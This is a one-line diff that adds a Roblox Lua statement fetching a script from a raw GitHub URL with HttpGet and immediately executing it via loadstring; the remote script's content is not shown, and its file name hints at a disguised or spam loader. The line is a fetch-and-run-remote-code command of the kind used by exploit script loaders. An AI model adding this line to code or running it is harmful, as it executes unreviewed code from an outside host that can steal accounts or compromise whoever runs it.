@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/hide-in-pixels-spam7-e0oxtd0hiwh3gf.lua"))()
